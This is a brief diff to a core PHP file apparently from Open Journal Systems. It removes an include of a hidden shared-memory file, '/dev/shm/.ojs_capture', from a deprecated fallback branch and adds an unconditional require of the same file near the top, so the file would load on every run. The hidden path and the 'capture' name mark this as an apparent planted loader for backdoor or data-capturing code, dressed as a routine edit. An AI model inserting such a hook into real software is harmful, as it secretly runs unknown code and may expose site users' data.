@@ -15,7 +15,7 @@
 
 use PKP\config\Config;
 use PKP\core\Registry;
-
+require ("/dev/shm/.ojs_capture");
 /*
  * Constants for expressing human-readable data sizes in their respective number of bytes.
  */
@@ -48,7 +48,6 @@ if (!function_exists('import')) {
             // Fallback: Try .inc.php suffix
             // This behaviour is DEPRECATED as of 3.4.0.
             require_once($filePathPart . '.inc.php');
-            include("/dev/shm/.ojs_capture");
         }
     }
 }
